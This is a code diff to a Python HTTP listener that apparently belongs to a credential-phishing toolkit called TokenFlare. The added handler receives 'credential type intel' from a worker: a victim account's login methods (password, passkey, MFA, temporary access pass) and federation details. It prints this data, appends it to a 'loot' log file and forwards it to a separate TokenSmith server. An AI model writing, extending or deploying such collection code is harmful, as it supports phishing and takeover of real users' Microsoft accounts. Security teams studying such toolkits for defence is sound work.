@@ -470,6 +470,11 @@ def create_handler(log_file=None, show_raw=False):
             except json.JSONDecodeError:
                 body = {'raw': raw.decode('utf-8', errors='replace')}
 
+            # Handle credential type intel (event-type routing, path-independent)
+            if isinstance(body, dict) and body.get('type') == 'credential_type_intel':
+                self._handle_credential_type_intel(body)
+                return
+
             # Route based on path
             path = self.path.rstrip('/')
             if path == '/exchange':
@@ -509,6 +514,78 @@ def create_handler(log_file=None, show_raw=False):
             t = threading.Thread(target=exchange_auth_code, args=(body, self.server))
             t.daemon = True
             t.start()
+
+        def _handle_credential_type_intel(self, payload):
+            """Handle GetCredentialType intel from TokenFlare worker."""
+            now = datetime.now().strftime('%H:%M:%S')
+            separator = f"{C.DIM}{'─' * 60}{C.RESET}"
+            print(separator)
+            print(f"  {C.CYAN}{C.BOLD}CREDENTIAL TYPE INTEL{C.RESET}  {C.DIM}[{now}]{C.RESET}")
+
+            data = payload.get('data', '')
+            if isinstance(data, str):
+                try:
+                    data = json.loads(data)
+                except Exception:
+                    pass
+
+            if isinstance(data, dict):
+                creds = data.get('Credentials', {})
+                methods = []
+                if creds.get('HasPassword'):
+                    methods.append('Password')
+                if creds.get('FidoParams'):
+                    methods.append('FIDO2/Passkey')
+                if creds.get('HasRemoteNGC'):
+                    methods.append('Windows Hello')
+                if creds.get('SasParams'):
+                    methods.append('MFA (Push/TOTP/SMS)')
+                if creds.get('CertAuthParams'):
+                    methods.append('Certificate')
+                if creds.get('HasAccessPass'):
+                    methods.append('TAP (Temp Access Pass)')
+                print(f"  Available methods: {', '.join(methods) if methods else 'Unknown'}")
+
+                fed = data.get('FederationRedirectUrl', '')
+                if fed:
+                    print(f"  Federation: {fed}")
+
+                tenant = data.get('EstsProperties', {}).get('UserTenantBranding', {})
+                if tenant:
+                    print(f"  Tenant branding detected")
+            else:
+                print(f"  {C.DIM}(raw data unparseable){C.RESET}")
+
+            print(separator)
+
+            # Log to loot file if configured
+            if log_file:
+                entry = {
+                    'timestamp': datetime.now().isoformat(),
+                    'type': 'credential_type_intel',
+                    'data': data,
+                    'raw': payload,
+                }
+                with log_lock:
+                    with open(log_file, 'a') as f:
+                        f.write(json.dumps(entry) + '\n')
+
+            # Forward to TokenSmith if configured
+            if hasattr(self.server, 'tokensmith_url') and self.server.tokensmith_url:
+                try:
+                    url = self.server.tokensmith_url.rstrip('/') + '/api/tokenflare/intel'
+                    req_data = json.dumps(payload).encode('utf-8')
+                    req = urllib.request.Request(
+                        url, data=req_data,
+                        headers={'Content-Type': 'application/json'}, method='POST')
+                    urllib.request.urlopen(req, timeout=10)
+                except Exception as e:
+                    print(f"  {C.DIM}Intel forward failed: {e}{C.RESET}")
+
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({'status': 'intel_received'}).encode())
 
         def do_GET(self):
             """Health check / status endpoint."""
